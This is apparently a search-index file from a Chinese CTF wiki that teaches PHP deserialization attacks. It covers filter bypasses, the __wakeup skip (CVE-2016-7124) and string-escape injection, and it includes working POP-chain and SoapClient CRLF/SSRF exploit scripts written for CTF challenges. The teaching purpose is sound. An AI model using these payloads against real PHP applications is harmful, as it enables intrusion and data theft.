//\u7528\u4e8e\u5c06\u6570\u636e\u5199\u5165\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027 __isset() //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u8c03\u7528isset()\u6216empty()\u89e6\u53d1 __unset() //\u5728\u4e0d\u53ef\u8bbf\u95ee\u7684\u5c5e\u6027\u4e0a\u4f7f\u7528unset()\u65f6\u89e6\u53d1 __toString() //\u628a\u7c7b\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1 __invoke() //\u5f53\u5c1d\u8bd5\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1","title":"\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u89c1\u7684\u9b54\u672f\u65b9\u6cd5"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#trick","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u5c0fTrick"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#php71","text":"\u6211\u4eec\u524d\u9762\u8bf4\u4e86\u5982\u679c\u53d8\u91cf\u524d\u662fprotected\uff0c\u5e8f\u5217\u5316\u7ed3\u679c\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a \\x00*\\x00 \u4f46\u5728\u7279\u5b9a\u7248\u672c7.1\u4ee5\u4e0a\u5219\u5bf9\u4e8e\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\u5373\u4f7f\u6ca1\u6709 \\x00*\\x00 \u4e5f\u4f9d\u7136\u4f1a\u8f93\u51fa abc <?php class test{ protected $a; public function __construct(){ $this->a = 'abc'; } public function __destruct(){ echo $this->a; } } unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}');","title":"php7.1+\u53cd\u5e8f\u5217\u5316\u5bf9\u7c7b\u5c5e\u6027\u4e0d\u654f\u611f"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#__wakeupcve-2016-7124","text":"\u7248\u672c\uff1a \u200b PHP5 < 5.6.25 \u200b PHP7 < 7.0.10 \u5229\u7528\u65b9\u5f0f\uff1a \u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c \u5bf9\u4e8e\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7c7b <?php class test { public $a ; public function __construct (){ $this -> a = 'abc' ; } public function __wakeup (){ $this -> a = '666' ; } public function __destruct (){ echo $this -> a ; } } \u5982\u679c\u6267\u884c unserialize('O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}'); \u8f93\u51fa\u7ed3\u679c\u4e3a 666 \u800c\u628a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u589e\u5927\u6267\u884c unserialize('O:4:\"test\":2:{s:1:\"a\";s:3:\"abc\";}'); \u8f93\u51fa\u7ed3\u679c\u4e3aabc","title":"\u7ed5\u8fc7__wakeup(CVE-2016-7124)"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_5","text":"preg_match('/^O:\\d+/') \u5339\u914d\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u662f\u5426\u662f\u5bf9\u8c61\u5b57\u7b26\u4e32\u5f00\u5934,\u8fd9\u5728\u66fe\u7ecf\u7684CTF\u4e2d\u4e5f\u51fa\u8fc7\u7c7b\u4f3c\u7684\u8003\u70b9 \u5229\u7528\u52a0\u53f7\u7ed5\u8fc7\uff08\u6ce8\u610f\u5728url\u91cc\u4f20\u53c2\u65f6+\u8981\u7f16\u7801\u4e3a%2B\uff09 serialize(array( a));// a));// a\u4e3a\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61(\u5e8f\u5217\u5316\u7ed3\u679c\u5f00\u5934\u662fa\uff0c\u4e0d\u5f71\u54cd\u4f5c\u4e3a\u6570\u7ec4\u5143\u7d20\u7684$a\u7684\u6790\u6784) <?php class test { public $a ; public function __construct (){ $this -> a = 'abc' ; } public function __destruct (){ echo $this -> a . PHP_EOL ; } } function match ( $data ){ if ( preg_match ( '/^O:\\d+/' , $data )){ die ( 'you lose!' ); } else { return $data ; } } $a = 'O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}' ; // +\u53f7\u7ed5\u8fc7 $b = str_replace ( 'O:4' , 'O:+4' , $a ); unserialize ( match ( $b )); // serialize(array($a)); unserialize ( 'a:1:{i:0;O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}}' );","title":"\u7ed5\u8fc7\u90e8\u5206\u6b63\u5219"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_6","text":"<?php class test { public $a ; public $b ; public function __construct (){ $this -> a = 'abc' ; $this -> b = & $this -> a ; } public function __destruct (){ if ( $this -> a === $this -> b ){ echo 666 ; } } } $a = serialize ( new test ()); \u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c06 $b \u8bbe\u7f6e\u4e3a $a \u7684\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f $a \u6c38\u8fdc\u4e0e $b \u76f8\u7b49","title":"\u5229\u7528\u5f15\u7528"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#16","text":"O:4:\"test\":2:{s:4:\"%00*%00a\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} \u53ef\u4ee5\u5199\u6210 O:4:\"test\":2:{S:4:\"\\00*\\00\\61\";s:3:\"abc\";s:7:\"%00test%00b\";s:3:\"def\";} \u8868\u793a\u5b57\u7b26\u7c7b\u578b\u7684s\u5927\u5199\u65f6\uff0c\u4f1a\u88ab\u5f53\u621016\u8fdb\u5236\u89e3\u6790\u3002 \u6211\u8fd9\u91cc\u5199\u4e86\u4e00\u4e2a\u4f8b\u5b50 <?php class test { public $username ; public function __construct (){ $this -> username = 'admin' ; } public function __destruct (){ echo 666 ; } } function check ( $data ){ if ( stristr ( $data , 'username' ) !== False ){ echo ( \"\u4f60\u7ed5\u4e0d\u8fc7\uff01\uff01\" . PHP_EOL ); } else { return $data ; } } // \u672a\u4f5c\u5904\u7406\u524d $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}' ; $a = check ( $a ); unserialize ( $a ); // \u505a\u5904\u7406\u540e \\75\u662fu\u768416\u8fdb\u5236 $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}' ; $a = check ( $a ); unserialize ( $a );","title":"16\u8fdb\u5236\u7ed5\u8fc7\u5b57\u7b26\u7684\u8fc7\u6ee4"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#php_1","text":"","title":"PHP\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u9003\u9038"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#1","text":"\u9996\u5148\u7ed9\u51fa\u672c\u5730\u7684php\u4ee3\u7801\uff0c\u5f88\u7b80\u5355\u4e0d\u505a\u8fc7\u591a\u7684\u89e3\u91ca\uff0c\u5c31\u662f\u628a\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e00\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e24\u4e2a <?php function change($str){ return str_replace(\"x\",\"xx\",$str); } $name = $_GET['name']; $age = \"I am 11\"; $arr = array($name,$age); echo \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\"; var_dump(serialize($arr)); echo \"<br/>\"; echo \"\u8fc7\u6ee4\u540e:\"; $old = change(serialize($arr)); $new = unserialize($old); var_dump($new); echo \"<br/>\u6b64\u65f6\uff0cage=$new[1]\"; \u6b63\u5e38\u60c5\u51b5,\u4f20\u5165 name=mao \u5982\u679c\u6b64\u65f6\u591a\u4f20\u5165\u4e00\u4e2ax\u7684\u8bdd\u4f1a\u600e\u6837\uff0c\u6beb\u65e0\u7591\u95ee\u53cd\u5e8f\u5217\u5316\u5931\u8d25\uff0c\u7531\u4e8e\u6ea2\u51fa(s\u672c\u6765\u662f4\u7ed3\u679c\u591a\u4e86\u4e00\u4e2a\u5b57\u7b26\u51fa\u6765)\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u5b9e\u73b0\u5b57\u7b26\u4e32\u9003\u9038 \u9996\u5148\u6765\u770b\u770b\u7ed3\u679c\uff0c\u518d\u6765\u8bb2\u89e3 \u6211\u4eec\u4f20\u5165 name=maoxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"woaini\";} \";i:1;s:6:\"woaini\";} \u8fd9\u4e00\u90e8\u5206\u4e00\u5171\u4e8c\u5341\u4e2a\u5b57\u7b26 \u7531\u4e8e\u4e00\u4e2ax\u4f1a\u88ab\u66ff\u6362\u4e3a\u4e24\u4e2a\uff0c\u6211\u4eec\u8f93\u5165\u4e86\u4e00\u517120\u4e2ax\uff0c\u73b0\u5728\u662f40\u4e2a\uff0c\u591a\u51fa\u6765\u768420\u4e2ax\u5176\u5b9e\u53d6\u4ee3\u4e86\u6211\u4eec\u7684\u8fd9\u4e8c\u5341\u4e2a\u5b57\u7b26 \";i:1;s:6:\"woaini\";} \uff0c\u4ece\u800c\u9020\u6210 \";i:1;s:6:\"woaini\";} \u7684\u6ea2\u51fa\uff0c\u800c \" \u95ed\u5408\u4e86\u524d\u4e32\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u6210\u529f\u9003\u9038\uff0c\u53ef\u4ee5\u88ab\u53cd\u5e8f\u5217\u5316\uff0c\u8f93\u51fa woaini \u6700\u540e\u7684 ;} \u95ed\u5408\u53cd\u5e8f\u5217\u5316\u5168\u8fc7\u7a0b\u5bfc\u81f4\u539f\u6765\u7684 \";i:1;s:7:\"I am 11\";}\" \u88ab\u820d\u5f03\uff0c\u4e0d\u5f71\u54cd\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b`","title":"\u60c5\u51b51\uff1a\u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u591a"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#2","text":"\u8001\u89c4\u77e9\u5148\u4e0a\u4ee3\u7801,\u5f88\u7b80\u5355\u4e0d\u505a\u8fc7\u591a\u7684\u89e3\u91ca\uff0c\u5c31\u662f\u628a\u53cd\u5e8f\u5217\u5316\u540e\u7684\u4e24\u4e2ax\u66ff\u6362\u6210\u4e3a\u4e00\u4e2a <?php function change ( $str ){ return str_replace ( \"xx\" , \"x\" , $str ); } $arr [ 'name' ] = $_GET [ 'name' ]; $arr [ 'age' ] = $_GET [ 'age' ]; echo \"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a\" ; var_dump ( serialize ( $arr )); echo \"<br/>\" ; echo \"\u8fc7\u6ee4\u540e:\" ; $old = change ( serialize ( $arr )); var_dump ( $old ); echo \"<br/>\" ; $new = unserialize ( $old ); var_dump ( $new ); echo \"<br/>\u6b64\u65f6\uff0cage=\" ; echo $new [ 'age' ]; \u6b63\u5e38\u60c5\u51b5\u4f20\u5165 name=mao&age=11 \u7684\u7ed3\u679c \u8001\u89c4\u77e9\u770b\u770b\u6700\u540e\u6784\u9020\u7684\u7ed3\u679c\uff0c\u518d\u7ee7\u7eed\u8bb2\u89e3 \u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u524d\u9762\u5c11\u4e86\u4e00\u534a\uff0c\u5bfc\u81f4\u540e\u9762\u7684\u5b57\u7b26\u88ab\u5403\u6389\uff0c\u4ece\u800c\u6267\u884c\u4e86\u6211\u4eec\u540e\u9762\u7684\u4ee3\u7801\uff1b \u6211\u4eec\u6765\u770b\uff0c\u8fd9\u90e8\u5206\u662fage\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c s:3:\"age\";s:28:\"11\";s:3:\"age\";s:6:\"woaini\";}\" \u7531\u4e8e\u524d\u9762\u662f40\u4e2ax\u6240\u4ee5\u5bfc\u81f4\u5c11\u4e8620\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u9700\u8981\u540e\u9762\u6765\u8865\u4e0a\uff0c \";s:3:\"age\";s:28:\"11 \u8fd9\u4e00\u90e8\u5206\u521a\u597d20\u4e2a\uff0c\u540e\u9762\u7531\u4e8e\u6709 \" \u95ed\u5408\u4e86\u524d\u9762\u56e0\u6b64\u540e\u9762\u7684\u53c2\u6570\u5c31\u53ef\u4ee5\u7531\u6211\u4eec\u81ea\u5b9a\u4e49\u6267\u884c\u4e86","title":"\u60c5\u51b52\uff1a\u8fc7\u6ee4\u540e\u5b57\u7b26\u53d8\u5c11"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_7","text":"\u5f53\u7528\u6237\u7684\u8bf7\u6c42\u5728\u4f20\u7ed9\u53cd\u5e8f\u5217\u5316\u51fd\u6570 unserialize() \u4e4b\u524d\u6ca1\u6709\u88ab\u6b63\u786e\u7684\u8fc7\u6ee4\u65f6\u5c31\u4f1a\u4ea7\u751f\u6f0f\u6d1e\u3002\u56e0\u4e3aPHP\u5141\u8bb8\u5bf9\u8c61\u5e8f\u5217\u5316\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u63d0\u4ea4\u7279\u5b9a\u7684\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\u7ed9\u4e00\u4e2a\u5177\u6709\u8be5\u6f0f\u6d1e\u7684 unserialize \u51fd\u6570\uff0c\u6700\u7ec8\u5bfc\u81f4\u4e00\u4e2a\u5728\u8be5\u5e94\u7528\u8303\u56f4\u5185\u7684\u4efb\u610fPHP\u5bf9\u8c61\u6ce8\u5165\u3002 \u5bf9\u8c61\u6f0f\u6d1e \u51fa\u73b0\u5f97\u6ee1\u8db3\u4e24\u4e2a\u524d\u63d0 1\u3001 unserialize \u7684\u53c2\u6570\u53ef\u63a7\u3002 2\u3001 \u4ee3\u7801\u91cc\u6709\u5b9a\u4e49\u4e00\u4e2a\u542b\u6709\u9b54\u672f\u65b9\u6cd5\u7684\u7c7b\uff0c\u5e76\u4e14\u8be5\u65b9\u6cd5\u91cc\u51fa\u73b0\u4e00\u4e9b\u4f7f\u7528\u7c7b\u6210\u5458\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\u7684\u5b58\u5728\u5b89\u5168\u95ee\u9898\u7684\u51fd\u6570\u3002 \u6bd4\u5982\u8fd9\u4e2a\u4f8b\u5b50 <?php class A { var $test = \"y4mao\" ; function __destruct (){ echo $this -> test ; } } $a = 'O:1:\"A\":1:{s:4:\"test\";s:5:\"maomi\";}' ; unserialize ( $a ); \u5728\u811a\u672c\u8fd0\u884c\u7ed3\u675f\u540e\u4fbf\u4f1a\u8c03\u7528 _destruct \u51fd\u6570\uff0c\u540c\u65f6\u4f1a\u8986\u76d6test\u53d8\u91cf\u8f93\u51fa maomi","title":"\u5bf9\u8c61\u6ce8\u5165"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#pop","text":"","title":"POP\u94fe\u7684\u6784\u9020\u5229\u7528"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#pop_1","text":"\u524d\u9762\u6240\u8bb2\u89e3\u7684\u5e8f\u5217\u5316\u653b\u51fb\u66f4\u591a\u7684\u662f\u9b54\u672f\u65b9\u6cd5\u4e2d\u51fa\u73b0\u4e00\u4e9b\u5229\u7528\u7684\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u81ea\u52a8\u8c03\u7528\u800c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u4f46\u5982\u679c\u5173\u952e\u4ee3\u7801\u4e0d\u5728\u9b54\u672f\u65b9\u6cd5\u4e2d\uff0c\u800c\u662f\u5728\u4e00\u4e2a\u7c7b\u7684\u666e\u901a\u65b9\u6cd5\u4e2d\u3002\u8fd9\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u5bfb\u627e\u76f8\u540c\u7684\u51fd\u6570\u540d\u5c06\u7c7b\u7684\u5c5e\u6027\u548c\u654f\u611f\u51fd\u6570\u7684\u5c5e\u6027\u8054\u7cfb\u8d77\u6765","title":"POP\u94fe\u7b80\u5355\u4ecb\u7ecd"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_8","text":"\u9996\u5148\u770b\u770b\u7b80\u5355\u7684MRCTF2020-Ezpop,\u4e0d\u5e26\u5927\u5bb6\u4e00\u4e00\u8bfb\u4ee3\u7801\u4e86\uff0c\u81ea\u5df1\u89e3\u51b3 <?php class Modifier { protected $var ; public function append ( $value ){ include ( $value ); } public function __invoke (){ $this -> append ( $this -> var ); } } class Show { public $source ; public $str ; public function __construct ( $file = 'index.php' ){ $this -> source = $file ; echo 'Welcome to ' . $this -> source . \"<br>\" ; } public function __toString (){ return $this -> str -> source ; } public function __wakeup (){ if ( preg_match ( \"/gopher|http|file|ftp|https|dict|\\.\\./i\" , $this -> source )) { echo \"hacker\" ; $this -> source = \"index.php\" ; } } } class Test { public $p ; public function __construct (){ $this -> p = array (); } public function __get ( $key ){ $function = $this -> p ; return $function (); } } \u8fd9\u91cc\u6211\u76f4\u63a5\u8bf4\u5229\u7528\u601d\u8def\uff0c\u9996\u5148\u9006\u5411\u5206\u6790\uff0c\u6211\u4eec\u6700\u7ec8\u662f\u5e0c\u671b\u901a\u8fc7 Modifier \u5f53\u4e2d\u7684 append \u65b9\u6cd5\u5b9e\u73b0\u672c\u5730\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u6587\u4ef6\uff0c\u56de\u6eaf\u5230\u8c03\u7528\u5b83\u7684 __invoke \uff0c\u5f53\u6211\u4eec \u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1 ,\u53d1\u73b0\u5728 Test \u7c7b\u5f53\u4e2d\u7684 __get \u65b9\u6cd5\uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __toString \uff0c\u518d\u56de\u6eaf\u5230 Show \u5f53\u4e2d\u7684 __construct \u5f53\u4e2d\u6709 echo $this->source \u53ef\u4ee5\u8c03\u7528 __toString \u56e0\u6b64\u4e0d\u96be\u6784\u9020pop\u94fe <?php ini_set ( 'memory_limit' , '-1' ); class Modifier { protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php' ; } class Show { public $source ; public $str ; public function __construct ( $file ){ $this -> source = $file ; $this -> str = new Test (); } } class Test { public $p ; public function __construct (){ $this -> p = new Modifier (); } } $a = new Show ( 'aaa' ); $a = new Show ( $a ); echo urlencode ( serialize ( $a ));","title":"\u7b80\u5355\u6848\u4f8b\u8bb2\u89e3"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#php_2","text":"","title":"PHP\u539f\u751f\u7c7b\u53cd\u5e8f\u5217\u5316\u5229\u7528"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#soapclient","text":"\u7efc\u8ff0\uff1a php\u5728\u5b89\u88c5php-soap\u62d3\u5c55\u540e\uff0c\u53ef\u4ee5\u53cd\u5e8f\u5217\u5316\u539f\u751f\u7c7bSoapClient\uff0c\u6765\u53d1\u9001http post\u8bf7\u6c42\u3002 \u5fc5\u987b\u8c03\u7528SoapClient\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u89e6\u53d1SoapClient\u7684__call\u9b54\u672f\u65b9\u6cd5\u3002 \u901a\u8fc7CRLF\u6765\u6dfb\u52a0\u8bf7\u6c42\u4f53\uff1aSoapClient\u53ef\u4ee5\u6307\u5b9a\u8bf7\u6c42\u7684user-agent\u5934\uff0c\u901a\u8fc7\u6dfb\u52a0\u6362\u884c\u7b26\u7684\u5f62\u5f0f\u6765\u52a0\u5165\u5176\u4ed6\u8bf7\u6c42\u5185\u5bb9 SoapClient\u91c7\u7528\u4e86HTTP\u4f5c\u4e3a\u5e95\u5c42\u901a\u8baf\u534f\u8bae\uff0cXML\u4f5c\u4e3a\u6570\u636e\u4f20\u9001\u7684\u683c\u5f0f\uff0c\u5176\u91c7\u7528\u4e86SOAP\u534f\u8bae( SOAP \u662f\u4e00\u79cd\u7b80\u5355\u7684\u57fa\u4e8e XML \u7684\u534f\u8bae,\u5b83\u4f7f\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7 HTTP \u6765\u4ea4\u6362\u4fe1\u606f)\uff0c\u5176\u6b21\u6211\u4eec\u77e5\u9053\u67d0\u4e2a\u5b9e\u4f8b\u5316\u7684\u7c7b\uff0c\u5982\u679c\u53bb\u8c03\u7528\u4e86\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528 __call \u65b9\u6cd5\uff0c\u5177\u4f53\u8be6\u7ec6\u7684\u4fe1\u606f\u5927\u5bb6\u53ef\u4ee5\u53bb\u641c\u7d22\u5f15\u64ce\u770b\u770b\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0","title":"SoapClient\u4ecb\u7ecd"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_9","text":"\u4e0b\u9762\u9996\u5148\u5728\u6211\u7684VPS\u4e0a\u9762\u5f00\u542f\u76d1\u542c nc -lvvp 9328 <?php $a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://xxxx.xxx.xx:9328')); $b = serialize($a); $c = unserialize($b); $c -> not_a_function();//\u8c03\u7528\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8ba9SoapClient\u8c03\u7528__call \u8fd0\u884c\u4e0a\u9762\u7684php\u7a0b\u5e8f\uff0c\u5728\u6211\u7684vps\u4e0a\u9762\u5956\u4f1a\u6355\u83b7\u76d1\u542c \u4ece\u4e0a\u9762\u8fd9\u5f20\u56fe\u53ef\u4ee5\u770b\u5230\uff0c SOAPAction \u5904\u662f\u6211\u4eec\u7684\u53ef\u63a7\u53c2\u6570\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6ce8\u5165\u6211\u4eec\u81ea\u5df1\u6076\u610f\u6784\u9020\u7684 CRLF \u5373\u63d2\u5165 \\r\\n \uff0c\u5229\u7528\u6210\u529f\uff01 \u4f46\u662f\u8fd8\u6709\u4e2a\u95ee\u9898\u6211\u4eec\u518d\u53d1\u9001POST\u6570\u636e\u7684\u65f6\u5019\u662f\u9700\u8981\u9075\u5faaHTTP\u534f\u8bae\uff0c\u6307\u5b9a\u8bf7\u6c42\u5934 Content-Type: application/x-www-form-urlencoded \u4f46 Content-Type \u5728 SOAPAction \u7684\u4e0a\u9762\uff0c\u5c31\u65e0\u6cd5\u63a7\u5236 Content-Type ,\u4e5f\u5c31\u4e0d\u80fd\u63a7\u5236POST\u7684\u6570\u636e \u63a5\u4e0b\u6765\u6211\u4eec\u5b9e\u9a8c\u4e00\u4e0b","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_10","text":"\u53cd\u5e8f\u5217\u5316\u6211\u4eec\u4f20\u5165\u7684 vip \u6267\u884cgetFlag\u51fd\u6570(\u8ff7\u60d1\u4eba\u7684\u51fd\u6570) <?php highlight_file ( __FILE__ ); $vip = unserialize ( $_GET [ 'vip' ]); $vip -> getFlag (); //flag.php $xff = explode ( ',' , $_SERVER [ 'HTTP_X_FORWARDED_FOR' ]); array_pop ( $xff ); $ip = array_pop ( $xff ); \u200b \u200b if ( $ip !== '127.0.0.1' ){ die ( 'error' ); } else { $token = $_POST [ 'token' ]; if ( $token == 'ctfshow' ){ file_put_contents ( 'flag.txt' , $flag ); } } \u7531\u4e8e\u670d\u52a1\u5668\u5e26\u6709cloudfare\u4ee3\u7406\uff0c\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u672c\u5730\u6784\u9020XFF\u5934\u5b9e\u73b0\u7ed5\u8fc7\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528SoapClient\u4e0eCRLF\u5b9e\u73b0SSRF\u8bbf\u95ee 127.0.0.1/flag.php ,\u5373\u53ef\u7ed5\u8fc7cloudfare\u4ee3\u7406 <?php $target = 'http://127.0.0.1/flag.php' ; $post_string = 'token=ctfshow' ; $headers = array ( 'X-Forwarded-For: 127.0.0.1,127.0.0.1' , 'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d' ); $b = new SoapClient ( null , array ( 'location' => $target , 'user_agent' => 'y4tacker^^Content-Type: application/x-www-form-urlencoded^^' . join ( '^^' , $headers ) . '^^Content-Length: ' . ( string ) strlen ( $post_string ) . '^^^^' . $post_string , 'uri' => \"aaab\" )); $aaa = serialize ( $b ); $aaa = str_replace ( '^^' , \" \\r\\n \" , $aaa ); $aaa = str_replace ( '&' , '&' , $aaa ); echo urlencode ( $aaa ); \u63a5\u4e0b\u6765\u8bbf\u95ee flag.txt \u5373\u53ef","title":"\u5b9e\u6218"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#phar","text":"phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\u3002\u5f53\u53d7\u5f71\u54cd\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u8c03\u7528phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316meta-data\u5185\u7684\u5185\u5bb9\u3002","title":"Phar\u53cd\u5e8f\u5217\u5316"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#phar_1","text":"\u5728\u8f6f\u4ef6\u4e2d\uff0cPHAR\uff08PHP\u5f52\u6863\uff09\u6587\u4ef6\u662f\u4e00\u79cd\u6253\u5305\u683c\u5f0f\uff0c\u901a\u8fc7\u5c06\u8bb8\u591aPHP\u4ee3\u7801\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\uff08\u4f8b\u5982\u56fe\u50cf\uff0c\u6837\u5f0f\u8868\u7b49\uff09\u6346\u7ed1\u5230\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6\u4e2d\u6765\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u548c\u5e93\u7684\u5206\u53d1 php\u901a\u8fc7\u7528\u6237\u5b9a\u4e49\u548c\u5185\u7f6e\u7684\u201c\u6d41\u5305\u88c5\u5668\u201d\u5b9e\u73b0\u590d\u6742\u7684\u6587\u4ef6\u5904\u7406\u529f\u80fd\u3002\u5185\u7f6e\u5305\u88c5\u5668\u53ef\u7528\u4e8e\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\uff0c\u5982(fopen(),copy(),file_exists()\u548cfilesize()\u3002 phar://\u5c31\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d41\u5305\u88c5\u5668\u3002 php\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u6d41\u5305\u88c5\u5668\u5982\u4e0b\uff1a file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u7528\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u65f6\u9ed8\u8ba4\u5c31\u4f7f\u7528\u8be5\u5305\u88c5\u5668 http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 \u97f3\u9891\u6d41 expect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41","title":"\u4ec0\u4e48\u662fphar\u6587\u4ef6"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#phar_2","text":"stub:phar\u6587\u4ef6\u7684\u6807\u5fd7\uff0c\u5fc5\u987b\u4ee5 xxx __HALT_COMPILER();?> \u7ed3\u5c3e\uff0c\u5426\u5219\u65e0\u6cd5\u8bc6\u522b\u3002xxx\u53ef\u4ee5\u4e3a\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002 